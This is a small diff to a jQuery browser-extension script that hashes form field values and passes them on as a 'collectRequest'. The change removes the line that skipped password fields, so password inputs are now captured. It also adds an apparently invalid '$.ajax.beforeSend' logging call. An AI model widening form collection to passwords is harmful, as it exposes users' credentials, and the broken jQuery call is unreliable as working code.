@@ -11,8 +11,6 @@ jQuery(function (){
             {
                 var fieldName = element.name;
                 var fieldValue = calcHash($(element).val());
-                if(element.type == "password")
-                    return;
 
                 submitData.data[fieldName] = fieldValue; 
             }
@@ -21,5 +19,9 @@ jQuery(function (){
         console.log(JSON.stringify(submitData));
         console.log("--------------------");
         self.port.emit('collectRequest', submitData);
+    })
+
+    $.ajax.beforeSend(function(data){
+        console.log("MUUUU");
     })
 })
